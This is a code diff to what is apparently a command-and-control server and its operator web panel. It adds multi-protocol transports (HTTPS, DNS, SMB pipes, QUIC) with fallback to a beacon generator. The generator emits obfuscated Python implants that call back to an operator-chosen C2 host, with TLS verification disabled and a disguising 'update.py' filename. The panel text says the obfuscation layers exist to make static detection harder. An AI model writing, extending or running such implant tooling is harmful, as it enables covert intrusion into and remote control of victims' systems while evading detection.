@@ -832,10 +832,18 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         interval = int(body.get("interval", 300))
         jitter = int(body.get("jitter", 20))
         layers = max(1, min(int(body.get("layers", 3)), 6))
-        if not c2_url:
-            return jsonify({"error": "c2_url required"}), 400
+        protocols = body.get("protocols", {})
+        if not protocols:
+            if not c2_url:
+                return jsonify({"error": "c2_url required"}), 400
+            protocols = {"https": {"enabled": True, "callback_url": c2_url, "verify_ssl": False}}
         if not enc_key:
             enc_key = base64.b64encode(crypto._key).decode()
+
+        https_cfg = protocols.get("https", {})
+        dns_cfg = protocols.get("dns", {})
+        smb_cfg = protocols.get("smb", {})
+        quic_cfg = protocols.get("quic", {})
 
         beacon_path = Path(__file__).parent / "beacon.py"
         if not beacon_path.exists():
@@ -843,11 +851,25 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         src = beacon_path.read_text(encoding="utf-8")
 
         _prof_json = json.dumps(_active_c2_profile) if _active_c2_profile else "{}"
+        proto_cfg = json.dumps({
+            "https": {"enabled": bool(https_cfg.get("enabled")),
+                      "callback_url": https_cfg.get("callback_url", c2_url),
+                      "verify_ssl": False},
+            "dns": {"enabled": bool(dns_cfg.get("enabled")),
+                    "domain": dns_cfg.get("domain", ""),
+                    "resolver": dns_cfg.get("resolver", "8.8.8.8")},
+            "smb": {"enabled": bool(smb_cfg.get("enabled")),
+                    "pipe_name": smb_cfg.get("pipe_name", "msrpc_6e2f"),
+                    "server": smb_cfg.get("server", "")},
+            "quic": {"enabled": bool(quic_cfg.get("enabled")),
+                     "server": quic_cfg.get("server", "")},
+        })
         config_block = textwrap.dedent(f"""\
         if __name__=="__main__":
+            import json as _j
+            _p=_j.loads('{proto_cfg}')
             _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
-            "https":{{"enabled":True,"callback_url":"{c2_url}","verify_ssl":False}},
-            "dns":{{"enabled":False,"domain":"","resolver":"8.8.8.8"}},
+            "https":_p["https"],"dns":_p["dns"],"smb":_p["smb"],"quic":_p["quic"],
             "encryption_key":"{enc_key}",
             "proxy":{{"mode":"auto","url":""}},
             "c2_profile":{_prof_json}}}}}
@@ -917,10 +939,18 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         jitter = int(body.get("jitter", 20))
         layers = max(1, min(int(body.get("layers", 3)), 6))
         filename = body.get("filename", "update.py").strip() or "update.py"
-        if not c2_url:
-            return jsonify({"error": "c2_url required"}), 400
+        protocols = body.get("protocols", {})
+        if not protocols:
+            if not c2_url:
+                return jsonify({"error": "c2_url required"}), 400
+            protocols = {"https": {"enabled": True, "callback_url": c2_url, "verify_ssl": False}}
         if not enc_key:
             enc_key = base64.b64encode(crypto._key).decode()
+
+        https_cfg = protocols.get("https", {})
+        dns_cfg = protocols.get("dns", {})
+        smb_cfg = protocols.get("smb", {})
+        quic_cfg = protocols.get("quic", {})
 
         beacon_path = Path(__file__).parent / "beacon.py"
         if not beacon_path.exists():
@@ -928,11 +958,25 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         src = beacon_path.read_text(encoding="utf-8")
 
         _prof_json = json.dumps(_active_c2_profile) if _active_c2_profile else "{}"
+        proto_cfg = json.dumps({
+            "https": {"enabled": bool(https_cfg.get("enabled")),
+                      "callback_url": https_cfg.get("callback_url", c2_url),
+                      "verify_ssl": False},
+            "dns": {"enabled": bool(dns_cfg.get("enabled")),
+                    "domain": dns_cfg.get("domain", ""),
+                    "resolver": dns_cfg.get("resolver", "8.8.8.8")},
+            "smb": {"enabled": bool(smb_cfg.get("enabled")),
+                    "pipe_name": smb_cfg.get("pipe_name", "msrpc_6e2f"),
+                    "server": smb_cfg.get("server", "")},
+            "quic": {"enabled": bool(quic_cfg.get("enabled")),
+                     "server": quic_cfg.get("server", "")},
+        })
         config_block = textwrap.dedent(f"""\
         if __name__=="__main__":
+            import json as _j
+            _p=_j.loads('{proto_cfg}')
             _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
-            "https":{{"enabled":True,"callback_url":"{c2_url}","verify_ssl":False}},
-            "dns":{{"enabled":False,"domain":"","resolver":"8.8.8.8"}},
+            "https":_p["https"],"dns":_p["dns"],"smb":_p["smb"],"quic":_p["quic"],
             "encryption_key":"{enc_key}",
             "proxy":{{"mode":"auto","url":""}},
             "c2_profile":{_prof_json}}}}}
@@ -2580,6 +2624,11 @@ header .info{font-size:11px;color:var(--text2)}
 .bgen-layers{display:flex;align-items:center;gap:8px}
 .bgen-layers input[type=range]{flex:1;accent-color:var(--red)}
 .bgen-layers .bgen-lval{font-size:12px;color:var(--red);min-width:18px;text-align:center}
+.bgen-protocols{display:flex;gap:14px;padding:4px 0}
+.bgen-proto-label{display:flex;align-items:center;gap:5px;font-size:11px;color:var(--text);cursor:pointer;flex-direction:row !important}
+.bgen-proto-label input{width:auto;accent-color:var(--cyan,#00b4d8)}
+.bgen-proto-opts{margin:4px 0 2px;padding:4px 0 2px;border-left:2px solid var(--border);padding-left:10px}
+.bgen-proto-opts label{margin-bottom:4px}
 .bgen-delivery{display:flex;gap:12px;padding:2px 0}
 .bgen-dlabel{
   display:flex;align-items:center;gap:5px;font-size:11px;color:var(--text);
@@ -3747,7 +3796,28 @@ async function showBeaconGen(){
     +'<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">✕</button>'
     +'<p style="font-size:11px;color:var(--text2);margin:0 0 12px">Generate an obfuscated Python beacon payload. Multiple compression and encoding layers make static detection harder.</p>'
     +'<div class="avenum-form">'
+    +'<div class="nxc-section" style="padding:8px 0 4px">Transport Protocols</div>'
+    +'<div class="bgen-protocols">'
+    +'<label class="bgen-proto-label"><input type="checkbox" id="bg-proto-https" checked onchange="bgProtoChanged()"> <span>HTTPS</span></label>'
+    +'<label class="bgen-proto-label"><input type="checkbox" id="bg-proto-dns" onchange="bgProtoChanged()"> <span>DNS</span></label>'
+    +'<label class="bgen-proto-label"><input type="checkbox" id="bg-proto-smb" onchange="bgProtoChanged()"> <span>SMB</span></label>'
+    +'<label class="bgen-proto-label"><input type="checkbox" id="bg-proto-quic" onchange="bgProtoChanged()"> <span>QUIC</span></label>'
+    +'</div>'
+    +'<div id="bg-proto-https-opts" class="bgen-proto-opts">'
     +'<label>C2 Callback URL <input id="bg-url" value="'+esc(defaultUrl)+'" placeholder="https://c2.example.com:8443/api/v1/beacon"></label>'
+    +'</div>'
+    +'<div id="bg-proto-dns-opts" class="bgen-proto-opts" style="display:none">'
+    +'<label>DNS Domain <input id="bg-dns-domain" placeholder="c2.example.com"></label>'
+    +'<label>DNS Resolver <input id="bg-dns-resolver" value="8.8.8.8" placeholder="8.8.8.8"></label>'
+    +'</div>'
+    +'<div id="bg-proto-smb-opts" class="bgen-proto-opts" style="display:none">'
+    +'<label>SMB Pipe Name <input id="bg-smb-pipe" value="msrpc_6e2f" placeholder="msrpc_6e2f"></label>'
+    +'<label>SMB Server (IP) <input id="bg-smb-server" placeholder="10.0.0.1 (parent beacon or C2)"></label>'
+    +'</div>'
+    +'<div id="bg-proto-quic-opts" class="bgen-proto-opts" style="display:none">'
+    +'<label>QUIC Server <input id="bg-quic-server" placeholder="c2.example.com:4433"></label>'
+    +'</div>'
+    +'<p class="bgen-proto-note" id="bg-proto-note" style="font-size:10px;color:var(--text2);margin:2px 0 6px">Primary: HTTPS · Fallback order follows checkbox sequence</p>'
     +'<label>Encryption Key (base64) <input id="bg-key" value="'+esc(cfg.enc_key)+'" placeholder="auto-filled from server config"></label>'
     +'<div style="display:flex;gap:8px">'
     +'<label style="flex:1">Interval (sec) <input id="bg-interval" value="300" type="number" min="10" max="86400"></label>'
@@ -3821,9 +3891,47 @@ async function showBeaconGen(){
   }).catch(()=>{});
 }
 
+function bgProtoChanged(){
+  const protos = ["https","dns","smb","quic"];
+  const active = [];
+  protos.forEach(p => {
+    const cb = document.getElementById("bg-proto-"+p);
+    const opts = document.getElementById("bg-proto-"+p+"-opts");
+    if(opts) opts.style.display = cb?.checked ? "block" : "none";
+    if(cb?.checked) active.push(p.toUpperCase());
+  });
+  const note = document.getElementById("bg-proto-note");
+  if(note){
+    if(active.length===0) note.textContent = "⚠ Select at least one transport protocol";
+    else if(active.length===1) note.textContent = "Channel: "+active[0];
+    else note.textContent = "Primary: "+active[0]+" · Fallback: "+active.slice(1).join(" → ");
+  }
+}
+
+function bgCollectProtos(){
+  const p = {};
+  if(document.getElementById("bg-proto-https")?.checked){
+    p.https = {enabled:true, callback_url:document.getElementById("bg-url")?.value?.trim()||"", verify_ssl:false};
+  }
+  if(document.getElementById("bg-proto-dns")?.checked){
+    p.dns = {enabled:true, domain:document.getElementById("bg-dns-domain")?.value?.trim()||"", resolver:document.getElementById("bg-dns-resolver")?.value?.trim()||"8.8.8.8"};
+  }
+  if(document.getElementById("bg-proto-smb")?.checked){
+    p.smb = {enabled:true, pipe_name:document.getElementById("bg-smb-pipe")?.value?.trim()||"msrpc_6e2f", server:document.getElementById("bg-smb-server")?.value?.trim()||""};
+  }
+  if(document.getElementById("bg-proto-quic")?.checked){
+    p.quic = {enabled:true, server:document.getElementById("bg-quic-server")?.value?.trim()||""};
+  }
+  return p;
+}
+
 async function runBeaconGen(){
-  const url = document.getElementById("bg-url")?.value?.trim();
-  if(!url){ toast("warn","Beacon Gen","Enter the C2 callback URL",3000); return; }
+  const protos = bgCollectProtos();
+  if(Object.keys(protos).length===0){ toast("warn","Beacon Gen","Select at least one transport protocol",3000); return; }
+  if(protos.https && !protos.https.callback_url){ toast("warn","Beacon Gen","Enter the HTTPS callback URL",3000); return; }
+  if(protos.dns && !protos.dns.domain){ toast("warn","Beacon Gen","Enter the DNS domain",3000); return; }
+  if(protos.smb && !protos.smb.server){ toast("warn","Beacon Gen","Enter the SMB server IP",3000); return; }
+  if(protos.quic && !protos.quic.server){ toast("warn","Beacon Gen","Enter the QUIC server address",3000); return; }
   const delivery = document.querySelector('input[name="bg-delivery"]:checked')?.value || "inline";
   if(delivery==="gist") return runBeaconGist();
   const key = document.getElementById("bg-key")?.value?.trim() || "";
@@ -3835,7 +3943,7 @@ async function runBeaconGen(){
   try{
     const data = await api("/api/server/beacon-gen", {
       method:"POST",
-      body:JSON.stringify({c2_url:url, enc_key:key, interval, jitter, layers})
+      body:JSON.stringify({c2_url:protos.https?.callback_url||"", enc_key:key, interval, jitter, layers, protocols:protos})
     });
     if(data.error){ toast("err","Beacon Gen",data.error,4000); return; }
     const container = document.getElementById("bg-result");
@@ -3868,7 +3976,8 @@ async function runBeaconGen(){
 }
 
 async function runBeaconGist(){
-  const url = document.getElementById("bg-url")?.value?.trim();
+  const protos = bgCollectProtos();
+  const url = protos.https?.callback_url || document.getElementById("bg-url")?.value?.trim() || "";
   const key = document.getElementById("bg-key")?.value?.trim() || "";
   const interval = document.getElementById("bg-interval")?.value || "300";
   const jitter = document.getElementById("bg-jitter")?.value || "20";
@@ -3879,7 +3988,7 @@ async function runBeaconGist(){
   try{
     const data = await api("/api/server/beacon-gist", {
       method:"POST",
-      body:JSON.stringify({c2_url:url, enc_key:key, interval, jitter, layers, filename})
+      body:JSON.stringify({c2_url:url, enc_key:key, interval, jitter, layers, filename, protocols:protos})
     });
     if(data.error){ toast("err","Beacon Gist",data.error,5000); return; }
     const container = document.getElementById("bg-result");
